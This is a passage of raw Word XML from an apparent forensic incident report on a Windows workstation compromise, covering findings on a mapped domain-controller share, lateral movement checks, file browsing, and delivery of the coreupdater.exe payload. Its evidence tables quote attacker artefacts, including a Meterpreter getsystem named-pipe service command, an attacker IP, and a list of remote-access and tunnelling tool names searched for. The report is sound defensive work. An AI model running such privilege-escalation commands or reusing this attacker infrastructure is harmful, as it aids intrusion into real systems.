        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>2020-09-18 22:45:26.988114 → 2020-09-19 04:08:16.637781</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Observed facts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>ricksanchez NTUSER.DAT: Map Network Drive MRU 'a' = \\CITADEL-DC01\FileShare (LastWrite 2020-09-18 22:45:26 UTC) and persistent mapping HKCU\Network\Z RemotePath = \\CITADEL-DC01\FileShare (LastWrite 22:52:49); MountPoints2\##CITADEL-DC01#FileShare 22:45:27. Pcap: SMB flow 10.42.85.115:50957 → 10.42.85.10:445 starting 06:08:16+0200 (= 04:08:16 pcap UTC ≈ 05:08:16 host UTC, ricksanchez logon) until end of capture, 15,650 bytes up / 12,757 bytes down; eve_smb TREE_CONNECT \\CITADEL-DC01\FileShare with Desktop.ini/AutoRun.inf/&lt;share_root&gt; opens (Explorer browsing artefacts). Memory netscan: same socket 10.42.85.115:50957 → 10.42.85.10:445 ESTABLISHED at capture.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>The mapping itself was created by ricksanchez on 2020-09-18 22:45 (pre-incident, legitimate admin setup). Its relevance: the Run-key Meterpreter (PowerShell PID 3316, F-016) runs in ricksanchez's Domain Admin context with Z: mounted, giving the attacker direct access to the DC file share and to the DC itself. The small byte counts on the SMB session (≈28 KB total) do not indicate bulk data transfer to/from the share during the capture window. No evidence of use of the share by the attacker; recorded as exposure / potential pivot path.</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22:52:49.690941</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd Kroll)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: key last written</w:t>
              <w:br/>
              <w:t>ROOT\Network\Z</w:t>
              <w:br/>
              <w:t>Network Shares | Network Shares | RemotePath=\\CITADEL-DC01\FileShare</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_F.csv#1462</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Users\ricksanchez\NTUSER.DAT</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 22:45:26.988114</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd Kroll)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: key last written</w:t>
              <w:br/>
              <w:t>ROOT\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Map Network Drive MRU</w:t>
              <w:br/>
              <w:t>Network Shares | Network Drive MRU | a=\\CITADEL-DC01\FileShare</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_F.csv#1465</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Users\ricksanchez\NTUSER.DAT</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 04:08:16.583483</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Network flows (Suricata)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>network flow: start</w:t>
              <w:br/>
              <w:t>10.42.85.10</w:t>
              <w:br/>
              <w:t>TCP 10.42.85.115:50957 -&gt; 10.42.85.10:445 smb state=established bytes=15650/12757</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_flow.jsonl#27563</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 04:08:16.637781</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Network events (Suricata)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>network event</w:t>
              <w:br/>
              <w:t>smb TCP 10.42.85.115:50957 -&gt; 10.42.85.10:445</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_smb.jsonl#241</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>raw.vol_netscan</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>{"TreeDepth": "0", "ForeignAddr": "10.42.85.10", "ForeignPort": "445", "LocalAddr": "10.42.85.115", "LocalPort": "50957", "Offset": "209519101090720", "Proto": "TCPv4", "State": "ESTABLISHED"}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>volatility/windows.netscan.NetScan.jsonl#88</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>F-024: Lateral movement assessment: workstation was an RDP target only; no outbound RDP/PsExec/WinRM/RMM pivot observed</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evtx:microsoft-windows-winrm%4operational.evtx</w:t>
              <w:br/>
              <w:t>evtx:system.evtx</w:t>
              <w:br/>
              <w:t>network</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Category</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>lateral movement</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>MITRE ATT&amp;CK</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>T1021.001</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Period (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>2020-09-19 02:35:55.347240 → 2020-09-19 03:43:14.990879</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Observed facts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Checked sources and results:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Inbound RDP: the only remote interactive access is C137\Administrator from DC 10.42.85.10 (already F-006/F-018; RCM 1149 03:36:23, RdpCoreTS 168 03:36:23; Suricata eve_rdp rows 281/283/284 are the same DC↔workstation session). Memory netscan: TermService svchost PID 520 LISTENING 0.0.0.0:3389, no other 3389 sessions at capture time.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Outbound RDP: no 'Terminal Server Client' keys in any NTUSER.DAT (registry_kroll), no MSTSC.EXE Prefetch, no .rdp files in $MFT; Suricata shows no flow from 10.42.85.115 to any host on 3389.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- PsExec/service-based: 7045 list (20 events) contains only VMware/OOBE drivers, coreupdater (03:42:42), nehgye (03:43:14, getsystem), WPD and FTK AccessData driver; no PSEXESVC or random-named remote service; no PsExec/PAExec/RemCom files in $MFT; no 5140/5145 events in the collection (file-share auditing not enabled).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- WinRM/remote PowerShell: WinRM/Operational holds only 145/254/161/142 quartets (01:07:33, 01:24:31, 03:36:56-03:37:00) generated by local SYSTEM (PID 448) enumerating 'wsman/1/config/listener' and failing with error 2150858770 (0x80338012, WinRM service not running) – client-side, at boot/logon; no 6/91/168 server-side WinRM sessions, no wsmprovhost.exe Prefetch.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- RMM tools: no AnyDesk/TeamViewer/ScreenConnect/RustDesk/Splashtop/Atera/VNC/ngrok/chisel/plink file names in $MFT.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Prefetch: no net.exe, wmic.exe, winrs.exe, mstsc.exe, schtasks.exe executions.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Network (pcap, host clock = pcap +1 h): the workstation only talks to DC 10.42.85.10 internally (53, 88, 389, 135, 445, 49155/49158 RPC, 123) and to 10.90.90.90 (DNSBL sinkhole); no flows to any other internal host on 445/3389/5985/5986/135/22, and no inbound flows on these ports other than the DC RDP session.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- ShellBags: no UNC/network paths.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Within the available telemetry, DESKTOP-SDN1RPT was the destination of lateral movement (DC → workstation over RDP with stolen Domain Administrator credentials) but was not used as a pivot to other internal hosts. Caveats: no 5140/5145 auditing, no Sysmon, and Meterpreter activity inside spoolsv.exe/PowerShell (F-015/F-016) could perform SMB/RPC actions that would only appear as DC traffic; the pcap shows none toward other hosts, but encrypted C2 content cannot be inspected. Pivoting through the Meterpreter channel (port forwarding) cannot be excluded by disk artifacts alone.</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03:36:56.014782</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-WinRM/Operational 145 | Microsoft-Windows-WinRM</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#36922</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Microsoft-Windows-WinRM%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:37:00.089782</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-WinRM/Operational 142 | Microsoft-Windows-WinRM</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#36925</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Microsoft-Windows-WinRM%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:35:55.347240</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Network events (Suricata)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>network event</w:t>
              <w:br/>
              <w:t>rdp TCP 10.42.85.115:3389 -&gt; 10.42.85.10:62514</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_rdp.jsonl#281</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:42:42.676537</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>C:\Windows\System32\coreupdater.exe</w:t>
              <w:br/>
              <w:t>System 7045 | Service Control Manager | A new service was installed in the system | Name: coreupdater | StartType: auto start | Account: LocalSystem | C:\Windows\System32\coreupdater.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#40866</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\System.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:43:14.990879</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>cmd.exe /c echo nehgye &amp;gt; \\.\pipe\nehgye</w:t>
              <w:br/>
              <w:t>System 7045 | Service Control Manager | A new service was installed in the system | Name: nehgye | StartType: demand start | Account: LocalSystem | cmd.exe /c echo nehgye &amp;gt; \\.\pipe\nehgye</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#40867</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\System.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.9 User activity on files and folders</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>I reviewed LNK (31), Jump Lists auto/custom, ShellBags (4 UsrClass hives), RecentDocs, OpenSave/LastVisited MRU, TypedURLs/TypedPaths, Windows Timeline (Administrator ActivitiesCache incl. CopyPaste), SIDR activity, $UsnJrnl/$MFT for the 03:36-05:20 window, USB/USBSTOR, and memory filescan/cmdscan.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>New findings:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- F-026 (high, confirmed): the attacker browsed the Admin, mortysmith and ricksanchez profiles (ShellBags 03:45:07-03:51:14) and opened the SSN, Plans, Portal_gun and Thoughts files. The Explorer zip "My Social Security Number.zip" was created at 03:46:15 (MFT 87470-2), renamed loot.zip at 03:46:18, and permanently deleted at 03:47:09 without going through the Recycle Bin. Its MFT entry was reused by Thoughts.lnk at 03:47:39.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- F-027 (high, confirmed): GUI workflow for the payload. Edge directory listing of 194.61.24.102 (03:39:29-03:44:52), SecHealthUI 03:39:38-54 (also added to F-007), Save-As via PickerHost into Downloads (03:40:00), Explorer move to System32 (03:40:42, same MFT entry), and clipboard pastes into cmd.exe at 03:41:21 and 03:42:38/41/44 around the sc.exe service creation.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- F-028 (info): the only USB device is the responder's SanDisk E: (VSN A6125E71), browsed 05:09-05:13 under ricksanchez. No attacker removable or network volumes appear in LNK, jump lists or ShellBags.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Timeline T-020..T-022 and IOC I-014 were added. Noise is documented in a note.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>F-027: Attacker GUI workflow for coreupdater.exe: Edge directory listing of 194.61.24.102, Save-As dialog, Explorer move Downloads→System32, clipboard pastes into cmd.exe</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artifact:$usnjrnl:$j</w:t>
              <w:br/>
              <w:t>artifact:jump lists (automatic)</w:t>
              <w:br/>
              <w:t>artifact:registry: lastvisitedpidlmru</w:t>
              <w:br/>
              <w:t>artifact:registry: opensavepidlmru</w:t>
              <w:br/>
              <w:t>artifact:shellbags</w:t>
              <w:br/>
              <w:t>artifact:windows search (activity history)</w:t>
              <w:br/>
              <w:t>artifact:windows timeline (activitiescache)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Category</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
